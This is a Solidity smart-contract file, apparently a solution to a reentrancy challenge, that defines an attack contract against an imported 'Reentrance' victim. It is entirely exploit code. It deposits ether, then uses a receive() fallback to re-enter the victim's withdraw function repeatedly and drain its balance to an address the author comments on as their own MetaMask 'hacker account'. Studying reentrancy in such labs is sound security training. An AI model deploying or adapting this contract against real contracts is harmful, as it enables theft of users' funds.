// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceAttack {
//0xABfc8AC7bF9830341aD62042367d4Cddd6eEf591 - hacker account (minha conta da metamask) 
    Reentrance public victim;
    address public hacker;
    uint targetValue = 1000000000000000;

    constructor(address _victimAddr){
        victim = Reentrance(payable(_victimAddr));
        hacker = msg.sender;
    }

    function attack()public {
        victim.donate(hacker);
        victim.withdraw(victim.balanceOf(hacker));
    }

    function donateAndWithdraw() public payable {
        require(msg.value >=targetValue);
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    function balance() public view returns (uint){
        return address(this).balance;
    }

    receive() external payable {
        uint targetBalance = address(victim).balance;
        if(targetBalance>=targetValue){
            //victim.withdraw(victim.balanceOf(hacker));
            victim.withdraw(targetValue);
        }
    }


}